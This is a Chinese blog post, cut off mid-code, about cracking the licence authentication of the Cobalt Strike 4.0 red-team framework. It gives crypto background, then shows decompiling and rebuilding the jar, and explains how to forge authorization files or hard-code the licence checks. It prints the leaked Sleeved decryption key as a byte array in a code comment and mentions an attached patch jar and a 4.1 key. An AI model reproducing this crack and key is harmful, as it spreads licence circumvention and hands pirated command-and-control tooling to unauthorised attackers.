    <content type="html"><![CDATA[<ul><li><font color="red">想要理解整个认证过程，必须要动手走一轮代码。</font></li><li><font color="#008000">想要理解整个认证过程，必须要动手走一轮代码。</font></li><li><font color="Blue">想要理解整个认证过程，必须要动手走一轮代码。</font></li><li><font face="STCAIYUN">想要理解整个认证过程，必须要动手走一轮代码。</font></li><li><font face="微软雅黑">想要理解整个认证过程，必须要动手走一轮代码。</font></li><li><font face="黑体">想要理解整个认证过程，必须要动手走一轮代码。</font></li></ul><a id="more"></a><blockquote><p>该文章在星球里吃了几个月的灰，后来看到 SleevedKey 在网上已经可以随便搜到，所以就索性放出来了。<br>已先投稿先知社区，链接为：<a href="https://xz.aliyun.com/t/8557" target="_blank" rel="noopener">https://xz.aliyun.com/t/8557</a></p></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这里提供了 CS 4.0 的认证过程，个人认为非常详细，文中配备认证的流程图，可以结合文中的代码注释，外加自己的 IDEA 调试，可以完整理解整个过程。因为 4.0 与 4.1 差了一个关键 key（前期的处理方式也多了一个步骤），因此这里就只针对 4.0 版本的认证进行说明。 附件中提供了 <code>CSHook.jar</code>，是针对 CS 4.1 版本的，并且文章中也明确提供了适用于 CS 4.1 的完整 key（使用该 key 需要删除多余的步骤，直接使用 4.0 的验证）。</p><p>很多人拿到原版之所以没有搞破解，是因为缺少了最重要的 Sleeved 解密 key。 其实，到了 4.X 版本，是没有办法进行”破解”的，因为 <code>AES 的密钥是无法进行破译</code>，所以 Sleeved 解密 key 只能等好心人提供。</p><p>CobaltStrike 4.X 的认证，如果对 Java 及密码学相关有所了解，理解起来并不难。但是对于它的破解来说，需要一个针对 Sleeved 模块的认证 key，这个 key 是无法进行穷举的，除非想不开了。因此对于破解来说，与其说破解，还不如说是将 key 进行补全了。</p><h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><h4 id="1-1、必备知识"><a href="#1-1、必备知识" class="headerlink" title="1.1、必备知识"></a>1.1、必备知识</h4><h5 id="1-1-1、RAS-算法之加密与签名的区别"><a href="#1-1-1、RAS-算法之加密与签名的区别" class="headerlink" title="1.1.1、RAS 算法之加密与签名的区别"></a>1.1.1、RAS 算法之加密与签名的区别</h5><hr><p>加密和签名都是为了安全性考虑，但略有不同。常有人问加密和签名是用私钥还是公钥？其实都是对加密和签名的作用有所混淆。简单的说，加密是为了防止信息被泄露，而签名是为了防止信息被篡改。这里举 2 个例子说明。</p><ul><li><strong>第一个场景</strong>：战场上，B 要给 A 传递一条消息，内容为某一指令。</li></ul><p>RSA 的加密过程如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）A 生成一对密钥（公钥和私钥），私钥不公开，A 自己保留。公钥为公开的，任何人可以获取。</span><br><span class="line">（<span class="number">2</span>）A 传递自己的公钥给 B，B 用 A 的公钥对消息进行加密。</span><br><span class="line">（<span class="number">3</span>）A 接收到 B 加密的消息，利用 A 自己的私钥对消息进行解密。</span><br></pre></td></tr></table></figure><p>　　在这个过程中，只有 2 次传递过程，第一次是 A 传递公钥给 B，第二次是 B 传递加密消息给 A，即使都被敌方截获，也没有危险性，因为只有A的私钥才能对消息进行解密，防止了消息内容的泄露。</p><ul><li><strong>第二个场景：</strong>A 收到 B 发的消息后，需要进行回复“收到”。</li></ul><p>RSA 签名的过程如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）A 生成一对密钥（公钥和私钥），私钥不公开，A 自己保留。公钥为公开的，任何人可以获取。</span><br><span class="line">（<span class="number">2</span>）A 用自己的私钥对消息加签，形成签名，并将加签的消息和消息本身一起传递给 B。</span><br><span class="line">（<span class="number">3</span>）B 收到消息后，在获取 A 的公钥进行验签，如果验签出来的内容与消息本身一致，证明消息是 A 回复的。</span><br></pre></td></tr></table></figure><p>　　在这个过程中，只有 2 次传递过程，第一次是 A 传递加签的消息和消息本身给 B，第二次是 B 获取 A 的公钥，即使都被敌方截获，也没有危险性，因为只有 A 的私钥才能对消息进行签名，即使知道了消息内容，也无法伪造带签名的回复给 B，防止了消息内容的篡改。</p><p>　　但是，综合两个场景你会发现，第一个场景虽然被截获的消息没有泄露，但是可以利用截获的公钥，将假指令进行加密，然后传递给 A。第二个场景虽然截获的消息不能被篡改，但是消息的内容可以利用公钥验签来获得，并不能防止泄露。所以在实际应用中，要根据情况使用，也可以同时使用加密和签名，比如 A 和 B 都有一套自己的公钥和私钥，当 A 要给 B 发送消息时，先用 B 的公钥对消息加密，再对加密的消息使用 A 的私钥加签名，达到既不泄露也不被篡改，更能保证消息的安全性。</p><p>　　<strong>总结：公钥加密、私钥解密；私钥签名、公钥验签。</strong></p><p>但是，有一个要注意的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当你用公钥加密的时候，需要用私钥解密。</span><br><span class="line">当你用私钥加密的时候，需要用公钥解密。</span><br></pre></td></tr></table></figure><h5 id="1-1-2、HMAC-消息摘要算法"><a href="#1-1-2、HMAC-消息摘要算法" class="headerlink" title="1.1.2、HMAC 消息摘要算法"></a>1.1.2、HMAC 消息摘要算法</h5><p><strong><em>MAC</em></strong>，全称 <code>Message Authentication Code</code>，也称为消息认证码（带密钥的Hash函数），通信实体双方使用的一种验证机制，保证消息数据完整性的一种工具。</p><p>在发送数据之前，发送方首先使用通信双方协商好的散列函数计算其摘要值。在双方共享的会话密钥作用下，由摘要值获得消息验证码。之后，它和数据一起被发送。接收方收到报文后，首先利用会话密钥还原摘要值，同时利用散列函数在本地计算所收到数据的摘要值，并将这两个数据进行比对。若两者相等，则报文通过认证。</p><p>说白了就是计算摘要的时候，需要一个秘钥 key，没有秘钥 key 就无法计算</p><h5 id="1-1-3、AES"><a href="#1-1-3、AES" class="headerlink" title="1.1.3、AES"></a>1.1.3、AES</h5><ul><li>破解 AES 算法需要多长时间？</li></ul><p>以 AES-128 算法为例，平均需要尝试 2^127 ≈ 1.7*10^38 个 128bit 的随机数作为密钥进行加解密运算，方能找到正确的密钥。</p><p>常言道，“天下武功，唯快不破”；反之，天下密码，快必可破。问题是，那得有多快？我们知道，比特币网络在全球范围内调用了非常庞大的硬件资源以达到极高的运算效率，每秒钟操作的 Hash 运算（SHA-256）可高达 2.5644*10^19次。虽然 AES 和 SHA-256 算法并不相同，运算量也有所差异，但我们不妨近似地用该数据估算全球人民众志成城破解 AES 算法所需要的时间。</p><p>假设 AES 的运算效率为 2.5644<em>10^19 ≈ 2^64.4753 次/秒，则进行 2^127 次 AES 运算所需要的时间为：<br>2^127 / 2^64.4753 ≈ 2^62.5247秒 ≈ 6.6345</em> 10^18 秒 ≈ 1.8429 <em>10^15 小时 ≈ 7.6789</em> 10^13 天 ≈ 2.104 * 10^11年 ≈ 210,400,000,000 年</p><h4 id="1-2、运行环境"><a href="#1-2、运行环境" class="headerlink" title="1.2、运行环境"></a>1.2、运行环境</h4><p>此次破解测试使用的工具及文件为：</p><ul><li><code>IntelliJ IDEA Community Edition 2020.1.4</code></li><li><code>Feb 22, 2020 - Cobalt Strike 4.0</code></li></ul><p>使用过 IDEA 的朋友都知道，它具备反编译 Jar 包的能力。</p><p>首先，我们使用 IDEA 新建一个工程，将原始 Jar 包作为依赖进行导入，如下图所示：</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-29_11-03-26.png" alt=""></p><p>此时 IDEA 将调用反编译模块，因此我们可以直接查看 jar 的源码，如图所示：</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-29_10-47-15.png" alt=""></p><p>但由于单个文件点击，并不利于我们的有效查看，因此可以提取 IDEA 的反编译功能，用于对原始 Jar 包的反编译。</p><p>下面我们进行测试，IDEA 的反编译功能依赖于 <code>java-decompiler.jar</code> ，该文件存在于以下路径当中：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%IDEA安装目录%\plugins\java-decompiler\lib\java-decompiler.jar</span><br></pre></td></tr></table></figure><p>其使用方法为:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true c:\my.jar d:\decompiled\</span><br></pre></td></tr></table></figure><p>将反编译后的 Jar 包进行解压，将解压的文件（带文件夹）放入 <code>src</code>（该步骤仅将需要更改的文件放入即可，当然，全部放也没关系），文件夹内，如下图所示：</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-29_10-57-38.png" alt=""></p><p>然后就是设置编译生成 Jar 的步骤。</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-29_11-07-55.png" alt=""></p><p>在 <code>Main Class</code> 中填写 <code>aggressor.Aggressor</code>，其余默认即可；然后尝试 <code>Build Artifacts...</code>，正常情况下，则生成一个新的 Jar 包。</p><p>最后，为了方便实时预览及调试，我们需要对 <code>Run</code> 进行简单设置。</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-29_11-15-22.png" alt=""></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.新建一个 run 配置</span><br><span class="line"><span class="number">2</span>.添加 JAR Application</span><br><span class="line"><span class="number">3</span>.选择运行的 Jar 包路径</span><br><span class="line"><span class="number">4</span>.配置启动该 Jar 包的虚拟选项</span><br><span class="line"><span class="number">5</span>.选择一个在执行 Run 操作时附带的操作</span><br><span class="line"><span class="number">6</span>.此处选择重新 Build Artiface</span><br><span class="line"></span><br><span class="line">注意：如果不选择 <span class="number">5</span>-<span class="number">6</span> 步骤，则在点击 Run 前，需要手动 Build Artiface。</span><br></pre></td></tr></table></figure><p>实践一下，是否配置都正常。出现以下信息就说明可行。</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-29_11-21-21.png" alt=""></p><p>这部分内容不理解的朋友，可以去看看红队学院（知识星球）相关视频：<a href="https://www.bilibili.com/video/BV1yz411i71Z" target="_blank" rel="noopener">RedCore 红队学院 CSTips</a></p><h3 id="0x02-CS-3-X-版本的认证过程"><a href="#0x02-CS-3-X-版本的认证过程" class="headerlink" title="0x02 CS 3.X 版本的认证过程"></a>0x02 CS 3.X 版本的认证过程</h3><p>其实，我们可以从头开始走一轮认证代码，3.X 相对简单，走下来其实不难。</p><p><strong><em>主要涉及的文件：</em></strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">common</span>/License  <span class="comment">// license 检查逻辑</span></span><br><span class="line"><span class="keyword">common</span>/Authorization <span class="comment">// 检查的细节实现</span></span><br><span class="line"><span class="keyword">common</span>/AuthCrypto   <span class="comment">// RSA 解密和解压</span></span><br><span class="line"><span class="keyword">common</span>/CommonUtils  <span class="comment">// 相关数据类型转换辅助</span></span><br></pre></td></tr></table></figure><p>先粗略说一下 3.X 的 .auth 整个加密过程是：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先对文本进行压缩，转换为 byte</span><br><span class="line">添加特征头 <span class="number">0xca</span>, <span class="number">0xfe</span>, <span class="number">0xc0</span>, <span class="number">0xbb</span>,<span class="number">0x00</span>, <span class="number">0x43</span></span><br><span class="line">使用 RSA 进行加密</span><br></pre></td></tr></table></figure><p>故此解密的话只需要逆向此流程即可，那么我们要伪造一个自己的授权文件的话，只需要把公钥替换为自己的，然后使用自己的私钥对文本内容进行加密即可。因为只有在验证 GUI 和 Console 的时候需要进行验证步骤，因此也可以直接写死 <code>isValid()</code>、<code>isPerpetual()</code> 和 <code>isAlmostExpired()</code> 的值。比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Authorization</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.valid = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">this</span>.validto = <span class="string">"forever"</span>;</span><br><span class="line">    <span class="keyword">this</span>.licensekey = <span class="string">"Cartier"</span>;</span><br><span class="line">    <span class="keyword">this</span>.watermark = <span class="number">1</span>;</span><br><span class="line">    MudgeSanity.systemDetail(<span class="string">"valid to"</span>, <span class="string">"perpetual"</span>);</span><br><span class="line">    MudgeSanity.systemDetail(<span class="string">"id"</span>, <span class="keyword">this</span>.watermark + <span class="string">""</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>4.0 相比于 3.14 版本，多了一轮新的验证及更为复杂。</p><h3 id="0x03-CS-4-X-版本的认证过程"><a href="#0x03-CS-4-X-版本的认证过程" class="headerlink" title="0x03 CS 4 .X 版本的认证过程"></a>0x03 CS 4 .X 版本的认证过程</h3><p><em>之所以只说这个 CS 4.x 的认证过程，是因为该认证是在 3.X 的基础上进行改进的。</em></p><p>首先从主函数开始查看，第一步认证：<code>License.checkLicenseGUI(new Authorization());</code>，我们在查看源码过程中，直接对源码进行注释即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aggressor</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String VERSION = <span class="string">"4.0 (20200222) "</span> + (License.isTrial() ? <span class="string">"Trial"</span> : <span class="string">"Licensed"</span>);</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> MultiFrame frame = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> MultiFrame <span class="title">getFrame</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> frame;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">      ParserConfig.installEscapeConstant(<span class="string">'c'</span>, <span class="string">"\u0003"</span>);</span><br><span class="line">      ParserConfig.installEscapeConstant(<span class="string">'U'</span>, <span class="string">"\u001f"</span>);</span><br><span class="line">      ParserConfig.installEscapeConstant(<span class="string">'o'</span>, <span class="string">"\u000f"</span>);</span><br><span class="line">      (<span class="keyword">new</span> UseSynthetica()).setup();</span><br><span class="line">      Requirements.checkGUI();</span><br><span class="line">      <span class="comment">// 认证开始</span></span><br><span class="line">      License.checkLicenseGUI(<span class="keyword">new</span> Authorization());</span><br><span class="line">      frame = <span class="keyword">new</span> MultiFrame();</span><br><span class="line">      (<span class="keyword">new</span> ConnectDialog(frame)).show();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-1、checkLicenseGUI"><a href="#3-1、checkLicenseGUI" class="headerlink" title="3.1、checkLicenseGUI()"></a>3.1、checkLicenseGUI()</h4><p>该函数是 CobaltStrike 的第一道验证，主要检查授权文件是否存在、解析的数据是否正确。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization var0)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 判断文件是否存在、有效，格式是否正确等，isValid 函数是一个 flag，默认为 false</span></span><br><span class="line">   <span class="keyword">if</span> (!var0.isValid()) &#123;</span><br><span class="line">      CommonUtils.print_error(<span class="string">"Your authorization file is not valid: "</span> + var0.getError());</span><br><span class="line">      JOptionPane.showMessageDialog((Component)<span class="keyword">null</span>, <span class="string">"Your authorization file is not valid.\n"</span> + var0.getError(), (String)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">      System.exit(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 判断是否过期</span></span><br><span class="line">   <span class="keyword">if</span> (!var0.isPerpetual()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (var0.isExpired()) &#123;</span><br><span class="line">         CommonUtils.print_error(<span class="string">"Your Cobalt Strike license is expired. Please contact sales@strategiccyber.com to renew. If you did renew, run the update program to refresh your authorization file."</span>);</span><br><span class="line">         JOptionPane.showMessageDialog((Component)<span class="keyword">null</span>, <span class="string">"Your Cobalt Strike license is expired.\nPlease contact sales@strategiccyber.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file."</span>, (String)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">         System.exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 计算有效期</span></span><br><span class="line">      <span class="keyword">if</span> (var0.isAlmostExpired()) &#123;</span><br><span class="line">         CommonUtils.print_warn(<span class="string">"Your Cobalt Strike license expires in "</span> + var0.whenExpires() + <span class="string">". Email sales@strategiccyber.com to renew. If you did renew, run the update program to refresh your authorization file."</span>);</span><br><span class="line">         JOptionPane.showMessageDialog((Component)<span class="keyword">null</span>, <span class="string">"Your Cobalt Strike license expires in "</span> + var0.whenExpires() + <span class="string">"\nEmail sales@strategiccyber.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file."</span>, (String)<span class="keyword">null</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是对 GUI 的一个验证，该验证有且仅有一次验证；它是调用 <code>Authorization</code> 类 中的 <code>isValid()</code>、<code>isPerpetual()</code> 和 <code>isAlmostExpired()</code>进行校验。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isValid</span><span class="params">()</span></span>  <span class="comment">// 判断文件是否存在、有效，格式是否正确等，isValid函数是一个flag，默认为false</span></span><br><span class="line"><span class="function"><span class="title">isPerpetual</span><span class="params">()</span></span> <span class="comment">// 判断 forever 关键字是否存在，存在则结束函数</span></span><br><span class="line"><span class="function"><span class="title">isAlmostExpired</span><span class="params">()</span></span> - <span class="comment">// 计算有效期</span></span><br><span class="line"></span><br><span class="line">注：这三个函数方法的返回可直接写死，以绕过验证。</span><br></pre></td></tr></table></figure><p>而它们都依赖于 <code>Authorization.Authorization()</code>，因此我们需要先对 <code>Authorization()</code> 进行分析。</p><h4 id="3-2、Authorization-的分析过程"><a href="#3-2、Authorization-的分析过程" class="headerlink" title="3.2、Authorization() 的分析过程"></a>3.2、Authorization() 的分析过程</h4><p>在 <code>Authorization</code> 类中，我们只需要查看 <code>Authorization()</code> 函数即可。</p><p>该函数主要解析授权码字段构成和有效期的计算，并且调用了 <code>AuthCrypto</code> 类的 <code>decrypt</code> 函数对文件进行解密，详细信息请看代码注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Authorization</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 读取当前目录中的 cobaltstrike.auth 文件</span></span><br><span class="line">   String str = CommonUtils.canonicalize(<span class="string">"cobaltstrike.auth"</span>);</span><br><span class="line">   <span class="comment">// 判断文件是否存在</span></span><br><span class="line">   <span class="keyword">if</span> (!(<span class="keyword">new</span> File(str)).exists()) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         File localFile = <span class="keyword">new</span> File(<span class="keyword">this</span>.getClass().getProtectionDomain().getCodeSource().getLocation().toURI());</span><br><span class="line">         <span class="keyword">if</span> (localFile.getName().toLowerCase().endsWith(<span class="string">".jar"</span>)) &#123;</span><br><span class="line">            localFile = localFile.getParentFile();</span><br><span class="line">         &#125;</span><br><span class="line">         str = (<span class="keyword">new</span> File(localFile, <span class="string">"cobaltstrike.auth"</span>)).getAbsolutePath();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception localException1) &#123;</span><br><span class="line">         <span class="comment">// 未找到该用于身份验证文件</span></span><br><span class="line">         MudgeSanity.logException(<span class="string">"trouble locating auth file"</span>, localException1, <span class="keyword">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 以 byte[]方式读取 cobaltstrike.auth 文件内容</span></span><br><span class="line">   <span class="keyword">byte</span>[] arrayOfByte1 = CommonUtils.readFile(str);</span><br><span class="line">   <span class="comment">// 判断长度，取决于文件内容</span></span><br><span class="line">   <span class="keyword">if</span> (arrayOfByte1.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.error = <span class="string">"Could not read "</span> + str;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 初始化 AuthCrypto 类，并在初始化时调用 load()，以校验 authkey.pub 文件是否符合要求</span></span><br><span class="line">      AuthCrypto authCrypto = <span class="keyword">new</span> AuthCrypto();</span><br><span class="line">      <span class="comment">// 调用 AuthCrypto 类中的 decrypt 方法对 cobaltstrike.auth 文件内容进行解密，校验文件是否符合要求，并返回 byte</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte2 = authCrypto.decrypt(arrayOfByte1);</span><br><span class="line">      <span class="keyword">if</span> (arrayOfByte2.length == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="keyword">this</span>.error = authCrypto.error();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 相比 3.14 版本，多了个 DateaParser，是用于解析 byte 类型数据的类</span></span><br><span class="line">            DataParser dataParser = <span class="keyword">new</span> DataParser(arrayOfByte2);</span><br><span class="line">            dataParser.big();</span><br><span class="line">            <span class="comment">// 该值是用于判断是否永久有效（是否为发行版）</span></span><br><span class="line">            <span class="keyword">int</span> i = dataParser.readInt();</span><br><span class="line">            <span class="comment">// 该值应该是水印作用。该值如果为 0，则在生成的 shellcode 中会带入 cs 水印（common/ListnerConfig.class）</span></span><br><span class="line">            <span class="keyword">this</span>.watermark = dataParser.readInt();</span><br><span class="line">            <span class="comment">// 该值是用于判断认证是否用于 Cobalt Strike 4.0+</span></span><br><span class="line">            <span class="keyword">byte</span> j = dataParser.readByte();</span><br><span class="line">            <span class="comment">// 取 16 个字节</span></span><br><span class="line">            <span class="keyword">byte</span> k = dataParser.readByte();</span><br><span class="line">            <span class="comment">// 获取关键 key，该 key是用于解密 Sleeved 的关键。</span></span><br><span class="line">            <span class="keyword">byte</span>[] arrayOfByte3 = dataParser.readBytes(k);</span><br><span class="line">            <span class="keyword">if</span> (j &lt; <span class="number">40</span>) &#123;</span><br><span class="line">               <span class="keyword">this</span>.error = <span class="string">"Authorization file is not for Cobalt Strike 4.0+"</span>;</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">29999999</span>) &#123;</span><br><span class="line">               <span class="comment">// 判断是否为 forever</span></span><br><span class="line">               <span class="keyword">this</span>.validto = <span class="string">"forever"</span>;</span><br><span class="line">               MudgeSanity.systemDetail(<span class="string">"valid to"</span>, <span class="string">"perpetual"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// 否则跳到试用期为20天</span></span><br><span class="line">               <span class="keyword">this</span>.validto = <span class="string">"20"</span> + i;</span><br><span class="line">               CommonUtils.print_stat(<span class="string">"Valid to is: '"</span> + <span class="keyword">this</span>.validto + <span class="string">"'"</span>);</span><br><span class="line">               MudgeSanity.systemDetail(<span class="string">"valid to"</span>, CommonUtils.formatDateAny(<span class="string">"MMMMM d, YYYY"</span>, <span class="keyword">this</span>.getExpirationDate()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.valid = <span class="keyword">true</span>;</span><br><span class="line">            MudgeSanity.systemDetail(<span class="string">"id"</span>, <span class="keyword">this</span>.watermark + <span class="string">""</span>);</span><br><span class="line">            <span class="comment">// 4.0 的 key 为 &#123;27, -27, -66, 82, -58, 37, 92, 51, 85, -114, -118, 28, -74, 103, -53, 6&#125;</span></span><br><span class="line">            SleevedResource.Setup(arrayOfByte3);</span><br><span class="line">         &#125; <span class="keyword">catch</span> (Exception localException2) &#123;</span><br><span class="line">            MudgeSanity.logException(<span class="string">"auth file parsing"</span>, localException2, <span class="keyword">false</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-3、AuthCrypto-类"><a href="#3-3、AuthCrypto-类" class="headerlink" title="3.3、AuthCrypto 类"></a>3.3、AuthCrypto 类</h4><p>看看对 <code>authkey.pub</code> 及 <code>cobaltstrike.auth</code> 解密的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 